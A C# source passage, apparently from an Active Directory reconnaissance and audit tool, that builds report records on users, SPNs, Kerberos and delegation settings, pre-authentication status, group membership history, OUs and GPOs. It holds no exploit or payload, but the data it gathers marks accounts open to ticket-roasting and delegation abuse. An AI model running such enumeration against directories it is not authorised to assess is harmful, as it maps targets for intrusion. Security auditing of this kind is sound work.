                    SchemaObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSchema.Members["DistinguishedName"].Value));
                    return new PSObject[] { SchemaObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class UserRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdUser = (PSObject) record;
                    bool? Enabled = null;
                    bool MustChangePasswordatLogon = false;
                    bool PasswordNotChangedafterMaxAge = false;
                    bool NeverLoggedIn = false;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    int? AccountExpirationNumofDays = null;
                    bool Dormant = false;
                    string SIDHistory = "";
                    bool? KerberosRC4 = null;
                    bool? KerberosAES128 = null;
                    bool? KerberosAES256 = null;
                    string DelegationType = null;
                    string DelegationProtocol = null;
                    string DelegationServices = null;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;
                    DateTime? AccountExpires = null;
                    bool? AccountNotDelegated = null;
                    bool? HasSPN = null;

                    try
                    {
                        // The Enabled field can be blank which raises an exception. This may occur when the user is not allowed to query the UserAccountControl attribute.
                        Enabled = (bool) AdUser.Members["Enabled"].Value;
                    }
                    catch //(Exception e)
                    {
                        //Console.WriteLine("Exception caught: {0}", e);
                    }
                    if (AdUser.Members["lastLogonTimeStamp"].Value != null)
                    {
                        //LastLogonDate = DateTime.FromFileTime((long)(AdUser.Members["lastLogonTimeStamp"].Value));
                        // LastLogonDate is lastLogonTimeStamp converted to local time
                        LastLogonDate = Convert.ToDateTime(AdUser.Members["LastLogonDate"].Value);
                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    else
                    {
                        NeverLoggedIn = true;
                    }
                    if (Convert.ToString(AdUser.Members["pwdLastSet"].Value) == "0")
                    {
                        if ((bool) AdUser.Members["PasswordNeverExpires"].Value == false)
                        {
                            MustChangePasswordatLogon = true;
                        }
                    }
                    if (AdUser.Members["PasswordLastSet"].Value != null)
                    {
                        //PasswordLastSet = DateTime.FromFileTime((long)(AdUser.Members["pwdLastSet"].Value));
                        // PasswordLastSet is pwdLastSet converted to local time
                        PasswordLastSet = Convert.ToDateTime(AdUser.Members["PasswordLastSet"].Value);
                        DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                        if (DaysSinceLastPasswordChange > PassMaxAge)
                        {
                            PasswordNotChangedafterMaxAge = true;
                        }
                    }
                    //https://msdn.microsoft.com/en-us/library/ms675098(v=vs.85).aspx
                    //if ((Int64) AdUser.Members["accountExpires"].Value != (Int64) 9223372036854775807)
                    //{
                        //if ((Int64) AdUser.Members["accountExpires"].Value != (Int64) 0)
                        if (AdUser.Members["AccountExpirationDate"].Value != null)
                        {
                            try
                            {
                                //AccountExpires = DateTime.FromFileTime((long)(AdUser.Members["accountExpires"].Value));
                                // AccountExpirationDate is accountExpires converted to local time
                                AccountExpires = Convert.ToDateTime(AdUser.Members["AccountExpirationDate"].Value);
                                AccountExpirationNumofDays = ((int)((DateTime)AccountExpires - Date1).Days);

                            }
                            catch //(Exception e)
                            {
                                //Console.WriteLine("Exception caught: {0}", e);
                            }
                        }
                    //}
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection history = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdUser.Members["SIDHistory"].Value;
                    string sids = "";
                    foreach (var value in history)
                    {
                        sids = sids + "," + Convert.ToString(value);
                    }
                    SIDHistory = sids.TrimStart(',');
                    if (AdUser.Members["msDS-SupportedEncryptionTypes"].Value != null)
                    {
                        var userKerbEncFlags = (KerbEncFlags) AdUser.Members["msDS-SupportedEncryptionTypes"].Value;
                        if (userKerbEncFlags != KerbEncFlags.ZERO)
                        {
                            KerberosRC4 = (userKerbEncFlags & KerbEncFlags.RC4_HMAC) == KerbEncFlags.RC4_HMAC;
                            KerberosAES128 = (userKerbEncFlags & KerbEncFlags.AES128_CTS_HMAC_SHA1_96) == KerbEncFlags.AES128_CTS_HMAC_SHA1_96;
                            KerberosAES256 = (userKerbEncFlags & KerbEncFlags.AES256_CTS_HMAC_SHA1_96) == KerbEncFlags.AES256_CTS_HMAC_SHA1_96;
                        }
                    }
                    if (AdUser.Members["UserAccountControl"].Value != null)
                    {
                        AccountNotDelegated = !((bool) AdUser.Members["AccountNotDelegated"].Value);
                        if ((bool) AdUser.Members["TrustedForDelegation"].Value)
                        {
                            DelegationType = "Unconstrained";
                            DelegationServices = "Any";
                        }
                        if (AdUser.Members["msDS-AllowedToDelegateTo"] != null)
                        {
                            Microsoft.ActiveDirectory.Management.ADPropertyValueCollection delegateto = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdUser.Members["msDS-AllowedToDelegateTo"].Value;
                            if (delegateto.Value != null)
                            {
                                DelegationType = "Constrained";
                                foreach (var value in delegateto)
                                {
                                    DelegationServices = DelegationServices + "," + Convert.ToString(value);
                                }
                                DelegationServices = DelegationServices.TrimStart(',');
                            }
                        }
                        if ((bool) AdUser.Members["TrustedToAuthForDelegation"].Value == true)
                        {
                            DelegationProtocol = "Any";
                        }
                        else if (DelegationType != null)
                        {
                            DelegationProtocol = "Kerberos";
                        }
                    }

                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection SPNs = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdUser.Members["servicePrincipalName"].Value;
                    if (SPNs.Value == null)
                    {
                        HasSPN = false;
                    }
                    else
                    {
                        HasSPN = true;
                    }

                    PSObject UserObj = new PSObject();
                    UserObj.Members.Add(new PSNoteProperty("UserName", CleanString(AdUser.Members["SamAccountName"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Name", CleanString(AdUser.Members["Name"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                    UserObj.Members.Add(new PSNoteProperty("Must Change Password at Logon", MustChangePasswordatLogon));
                    UserObj.Members.Add(new PSNoteProperty("Cannot Change Password", AdUser.Members["CannotChangePassword"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Password Never Expires", AdUser.Members["PasswordNeverExpires"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Reversible Password Encryption", AdUser.Members["AllowReversiblePasswordEncryption"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Smartcard Logon Required", AdUser.Members["SmartcardLogonRequired"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Permitted", AccountNotDelegated));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos DES Only", AdUser.Members["UseDESKeyOnly"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos RC4", KerberosRC4));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos AES-128bit", KerberosAES128));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos AES-256bit", KerberosAES256));
                    UserObj.Members.Add(new PSNoteProperty("Does Not Require Pre Auth", AdUser.Members["DoesNotRequirePreAuth"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Never Logged in", NeverLoggedIn));
                    UserObj.Members.Add(new PSNoteProperty("Logon Age (days)", DaysSinceLastLogon));
                    UserObj.Members.Add(new PSNoteProperty("Password Age (days)", DaysSinceLastPasswordChange));
                    UserObj.Members.Add(new PSNoteProperty("Dormant (> " + DormantTimeSpan + " days)", Dormant));
                    UserObj.Members.Add(new PSNoteProperty("Password Age (> " + PassMaxAge + " days)", PasswordNotChangedafterMaxAge));
                    UserObj.Members.Add(new PSNoteProperty("Account Locked Out", AdUser.Members["LockedOut"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Password Expired", AdUser.Members["PasswordExpired"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Password Not Required", AdUser.Members["PasswordNotRequired"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Type", DelegationType));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Protocol", DelegationProtocol));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Services", DelegationServices));
                    UserObj.Members.Add(new PSNoteProperty("Logon Workstations", AdUser.Members["LogonWorkstations"].Value));
                    UserObj.Members.Add(new PSNoteProperty("AdminCount", AdUser.Members["AdminCount"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Primary GroupID", AdUser.Members["primaryGroupID"].Value));
                    UserObj.Members.Add(new PSNoteProperty("SID", AdUser.Members["SID"].Value));
                    UserObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    UserObj.Members.Add(new PSNoteProperty("HasSPN", HasSPN));
                    UserObj.Members.Add(new PSNoteProperty("Description", CleanString(AdUser.Members["Description"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Title", CleanString(AdUser.Members["Title"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Department", CleanString(AdUser.Members["Department"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Company", CleanString(AdUser.Members["Company"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Manager", CleanString(AdUser.Members["Manager"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Info", CleanString(AdUser.Members["Info"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Last Logon Date", LastLogonDate));
                    UserObj.Members.Add(new PSNoteProperty("Password LastSet", PasswordLastSet));
                    UserObj.Members.Add(new PSNoteProperty("Account Expiration Date", AccountExpires));
                    UserObj.Members.Add(new PSNoteProperty("Account Expiration (days)", AccountExpirationNumofDays));
                    UserObj.Members.Add(new PSNoteProperty("Mobile", CleanString(AdUser.Members["Mobile"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Email", CleanString(AdUser.Members["mail"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("HomeDirectory", AdUser.Members["homeDirectory"].Value));
                    UserObj.Members.Add(new PSNoteProperty("ProfilePath", AdUser.Members["profilePath"].Value));
                    UserObj.Members.Add(new PSNoteProperty("ScriptPath", AdUser.Members["ScriptPath"].Value));
                    UserObj.Members.Add(new PSNoteProperty("UserAccountControl", AdUser.Members["UserAccountControl"].Value));
                    UserObj.Members.Add(new PSNoteProperty("First Name", CleanString(AdUser.Members["givenName"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Middle Name", CleanString(AdUser.Members["middleName"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Last Name", CleanString(AdUser.Members["sn"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Country", CleanString(AdUser.Members["c"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("whenCreated", AdUser.Members["whenCreated"].Value));
                    UserObj.Members.Add(new PSNoteProperty("whenChanged", AdUser.Members["whenChanged"].Value));
                    UserObj.Members.Add(new PSNoteProperty("DistinguishedName", CleanString(AdUser.Members["DistinguishedName"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("CanonicalName", CleanString(AdUser.Members["CanonicalName"].Value)));
                    return new PSObject[] { UserObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class UserSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdUser = (PSObject) record;
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection SPNs = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdUser.Members["servicePrincipalName"].Value;
                    if (SPNs.Value == null)
                    {
                        return new PSObject[] { };
                    }
                    List<PSObject> SPNList = new List<PSObject>();
                    bool? Enabled = null;
                    string Memberof = null;
                    DateTime? PasswordLastSet = null;

                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdUser.Members["userAccountControl"].Value != null)
                    {
                        var userFlags = (UACFlags) AdUser.Members["userAccountControl"].Value;
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                    }
                    if (Convert.ToString(AdUser.Members["pwdLastSet"].Value) != "0")
                    {
                        PasswordLastSet = DateTime.FromFileTime((long)AdUser.Members["pwdLastSet"].Value);
                    }
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberOfAttribute = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdUser.Members["memberof"].Value;
                    if (MemberOfAttribute.Value != null)
                    {
                        foreach (string Member in MemberOfAttribute)
                        {
                            Memberof = Memberof + "," + ((Convert.ToString(Member)).Split(',')[0]).Split('=')[1];
                        }
                        Memberof = Memberof.TrimStart(',');
                    }
                    string Description = CleanString(AdUser.Members["Description"].Value);
                    string PrimaryGroupID = Convert.ToString(AdUser.Members["primaryGroupID"].Value);
                    foreach (string SPN in SPNs)
                    {
                        string[] SPNArray = SPN.Split('/');
                        PSObject UserSPNObj = new PSObject();
                        UserSPNObj.Members.Add(new PSNoteProperty("Username", CleanString(AdUser.Members["SamAccountName"].Value)));
                        UserSPNObj.Members.Add(new PSNoteProperty("Name", CleanString(AdUser.Members["Name"].Value)));
                        UserSPNObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                        UserSPNObj.Members.Add(new PSNoteProperty("Service", SPNArray[0]));
                        UserSPNObj.Members.Add(new PSNoteProperty("Host", SPNArray[1]));
                        UserSPNObj.Members.Add(new PSNoteProperty("Password Last Set", PasswordLastSet));
                        UserSPNObj.Members.Add(new PSNoteProperty("Description", Description));
                        UserSPNObj.Members.Add(new PSNoteProperty("Primary GroupID", PrimaryGroupID));
                        UserSPNObj.Members.Add(new PSNoteProperty("Memberof", Memberof));
                        SPNList.Add( UserSPNObj );
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGroup = (PSObject) record;
                    string ManagedByValue = Convert.ToString(AdGroup.Members["managedBy"].Value);
                    string ManagedBy = "";
                    string SIDHistory = "";

                    if (AdGroup.Members["managedBy"].Value != null)
                    {
                        ManagedBy = (ManagedByValue.Split(new string[] { "CN=" },StringSplitOptions.RemoveEmptyEntries))[0].Split(new string[] { "OU=" },StringSplitOptions.RemoveEmptyEntries)[0].TrimEnd(',');
                    }
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection history = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdGroup.Members["SIDHistory"].Value;
                    string sids = "";
                    foreach (var value in history)
                    {
                        sids = sids + "," + Convert.ToString(value);
                    }
                    SIDHistory = sids.TrimStart(',');

                    PSObject GroupObj = new PSObject();
                    GroupObj.Members.Add(new PSNoteProperty("Name", AdGroup.Members["SamAccountName"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("AdminCount", AdGroup.Members["AdminCount"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("GroupCategory", AdGroup.Members["GroupCategory"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("GroupScope", AdGroup.Members["GroupScope"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("ManagedBy", ManagedBy));
                    GroupObj.Members.Add(new PSNoteProperty("SID", AdGroup.Members["sid"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    GroupObj.Members.Add(new PSNoteProperty("Description", CleanString(AdGroup.Members["Description"].Value)));
                    GroupObj.Members.Add(new PSNoteProperty("whenCreated", AdGroup.Members["whenCreated"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("whenChanged", AdGroup.Members["whenChanged"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("DistinguishedName", CleanString(AdGroup.Members["DistinguishedName"].Value)));
                    GroupObj.Members.Add(new PSNoteProperty("CanonicalName", AdGroup.Members["CanonicalName"].Value));
                    return new PSObject[] { GroupObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupChangeRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGroup = (PSObject) record;
                    string Action = null;
                    int? DaysSinceAdded = null;
                    int? DaysSinceRemoved = null;
                    DateTime? AddedDate = null;
                    DateTime? RemovedDate = null;
                    List<PSObject> GroupChangesList = new List<PSObject>();

                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection ReplValueMetaData = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdGroup.Members["msDS-ReplValueMetaData"].Value;

                    if (ReplValueMetaData.Value != null)
                    {
                        foreach (string ReplData in ReplValueMetaData)
                        {
                            XmlDocument ReplXML = new XmlDocument();
                            ReplXML.LoadXml(ReplData.Replace("\x00", "").Replace("&","&amp;"));

                            if (ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeDeleted"].InnerText != "1601-01-01T00:00:00Z")
                            {
                                Action = "Removed";
                                AddedDate = DateTime.Parse(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeCreated"].InnerText);
                                DaysSinceAdded = Math.Abs((Date1 - (DateTime) AddedDate).Days);
                                RemovedDate = DateTime.Parse(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeDeleted"].InnerText);
                                DaysSinceRemoved = Math.Abs((Date1 - (DateTime) RemovedDate).Days);
                            }
                            else
                            {
                                Action = "Added";
                                AddedDate = DateTime.Parse(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeCreated"].InnerText);
                                DaysSinceAdded = Math.Abs((Date1 - (DateTime) AddedDate).Days);
                                RemovedDate = null;
                                DaysSinceRemoved = null;
                            }

                            PSObject GroupChangeObj = new PSObject();
                            GroupChangeObj.Members.Add(new PSNoteProperty("Group Name", AdGroup.Members["SamAccountName"].Value));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Group DistinguishedName", CleanString(AdGroup.Members["DistinguishedName"].Value)));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Member DistinguishedName", CleanString(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["pszObjectDn"].InnerText)));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Action", Action));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Added Age (Days)", DaysSinceAdded));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Removed Age (Days)", DaysSinceRemoved));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Added Date", AddedDate));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Removed Date", RemovedDate));
                            GroupChangeObj.Members.Add(new PSNoteProperty("ftimeCreated", ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeCreated"].InnerText));
                            GroupChangeObj.Members.Add(new PSNoteProperty("ftimeDeleted", ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeDeleted"].InnerText));
                            GroupChangesList.Add( GroupChangeObj );
                        }
                    }
                    return GroupChangesList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGroup = (PSObject) record;
                    ADWSClass.AdGroupDictionary.Add((Convert.ToString(AdGroup.Properties["SID"].Value)), (Convert.ToString(AdGroup.Members["SamAccountName"].Value)));
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupMemberRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    // based on https://github.com/BloodHoundAD/BloodHound/blob/master/PowerShell/BloodHound.ps1
                    PSObject AdGroup = (PSObject) record;
                    List<PSObject> GroupsList = new List<PSObject>();
                    string SamAccountType = Convert.ToString(AdGroup.Members["samaccounttype"].Value);
                    string ObjectClass = Convert.ToString(AdGroup.Members["ObjectClass"].Value);
                    string AccountType = "";
                    string GroupName = "";
                    string MemberUserName = "-";
                    string MemberName = "";
                    string PrimaryGroupID = "";
                    PSObject GroupMemberObj = new PSObject();

                    if (ObjectClass == "foreignSecurityPrincipal")
                    {
                        AccountType = "foreignSecurityPrincipal";
                        MemberUserName = ((Convert.ToString(AdGroup.Members["DistinguishedName"].Value)).Split(',')[0]).Split('=')[1];
                        MemberName = null;
                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberGroups = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdGroup.Members["memberof"].Value;
                        if (MemberGroups.Value != null)
                        {
                            foreach (string GroupMember in MemberGroups)
                            {
                                GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                                GroupMemberObj = new PSObject();
                                GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                                GroupsList.Add( GroupMemberObj );
                            }
                        }
                    }
                    if (Groups.Contains(SamAccountType))
                    {
                        AccountType = "group";
                        MemberName = ((Convert.ToString(AdGroup.Members["DistinguishedName"].Value)).Split(',')[0]).Split('=')[1];
                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberGroups = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdGroup.Members["memberof"].Value;
                        if (MemberGroups.Value != null)
                        {
                            foreach (string GroupMember in MemberGroups)
                            {
                                GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                                GroupMemberObj = new PSObject();
                                GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                                GroupsList.Add( GroupMemberObj );
                            }
                        }
                    }
                    if (Users.Contains(SamAccountType))
                    {
                        AccountType = "user";
                        MemberName = ((Convert.ToString(AdGroup.Members["DistinguishedName"].Value)).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Members["sAMAccountName"].Value);
                        PrimaryGroupID = Convert.ToString(AdGroup.Members["primaryGroupID"].Value);
                        try
                        {
                            GroupName = ADWSClass.AdGroupDictionary[ADWSClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("Exception caught: {0}", e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                        GroupsList.Add( GroupMemberObj );

                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberGroups = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdGroup.Members["memberof"].Value;
                        if (MemberGroups.Value != null)
                        {
                            foreach (string GroupMember in MemberGroups)
                            {
                                GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                                GroupMemberObj = new PSObject();
                                GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                                GroupsList.Add( GroupMemberObj );
                            }
                        }
                    }
                    if (Computers.Contains(SamAccountType))
                    {
                        AccountType = "computer";
                        MemberName = ((Convert.ToString(AdGroup.Members["DistinguishedName"].Value)).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Members["sAMAccountName"].Value);
                        PrimaryGroupID = Convert.ToString(AdGroup.Members["primaryGroupID"].Value);
                        try
                        {
                            GroupName = ADWSClass.AdGroupDictionary[ADWSClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("Exception caught: {0}", e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                        GroupsList.Add( GroupMemberObj );

                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberGroups = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdGroup.Members["memberof"].Value;
                        if (MemberGroups.Value != null)
                        {
                            foreach (string GroupMember in MemberGroups)
                            {
                                GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                                GroupMemberObj = new PSObject();
                                GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                                GroupsList.Add( GroupMemberObj );
                            }
                        }
                    }
                    if (TrustAccounts.Contains(SamAccountType))
                    {
                        AccountType = "trust";
                        MemberName = ((Convert.ToString(AdGroup.Members["DistinguishedName"].Value)).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Members["sAMAccountName"].Value);
                        PrimaryGroupID = Convert.ToString(AdGroup.Members["primaryGroupID"].Value);
                        try
                        {
                            GroupName = ADWSClass.AdGroupDictionary[ADWSClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("Exception caught: {0}", e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                        GroupsList.Add( GroupMemberObj );
                    }
                    return GroupsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class OURecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdOU = (PSObject) record;
                    PSObject OUObj = new PSObject();
                    OUObj.Members.Add(new PSNoteProperty("Name", AdOU.Members["Name"].Value));
                    OUObj.Members.Add(new PSNoteProperty("Depth", ((Convert.ToString(AdOU.Members["DistinguishedName"].Value).Split(new string[] { "OU=" }, StringSplitOptions.None)).Length -1)));
                    OUObj.Members.Add(new PSNoteProperty("Description", AdOU.Members["Description"].Value));
                    OUObj.Members.Add(new PSNoteProperty("whenCreated", AdOU.Members["whenCreated"].Value));
                    OUObj.Members.Add(new PSNoteProperty("whenChanged", AdOU.Members["whenChanged"].Value));
                    OUObj.Members.Add(new PSNoteProperty("DistinguishedName", AdOU.Members["DistinguishedName"].Value));
                    return new PSObject[] { OUObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GPORecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGPO = (PSObject) record;

                    PSObject GPOObj = new PSObject();
                    GPOObj.Members.Add(new PSNoteProperty("DisplayName", CleanString(AdGPO.Members["DisplayName"].Value)));
                    GPOObj.Members.Add(new PSNoteProperty("GUID", CleanString(AdGPO.Members["Name"].Value)));
                    GPOObj.Members.Add(new PSNoteProperty("whenCreated", AdGPO.Members["whenCreated"].Value));
                    GPOObj.Members.Add(new PSNoteProperty("whenChanged", AdGPO.Members["whenChanged"].Value));
                    GPOObj.Members.Add(new PSNoteProperty("DistinguishedName", CleanString(AdGPO.Members["DistinguishedName"].Value)));
                    GPOObj.Members.Add(new PSNoteProperty("FilePath", AdGPO.Members["gPCFileSysPath"].Value));
                    return new PSObject[] { GPOObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GPORecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGPO = (PSObject) record;
                    ADWSClass.AdGPODictionary.Add((Convert.ToString(AdGPO.Members["DistinguishedName"].Value).ToUpper()), (Convert.ToString(AdGPO.Members["DisplayName"].Value)));
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class SOMRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdSOM = (PSObject) record;
                    List<PSObject> SOMsList = new List<PSObject>();
                    int Depth = 0;
                    bool BlockInheritance = false;
                    bool? LinkEnabled = null;
                    bool? Enforced = null;
                    string gPLink = Convert.ToString(AdSOM.Members["gPLink"].Value);
                    string GPOName = null;

                    Depth = (Convert.ToString(AdSOM.Members["DistinguishedName"].Value).Split(new string[] { "OU=" }, StringSplitOptions.None)).Length -1;
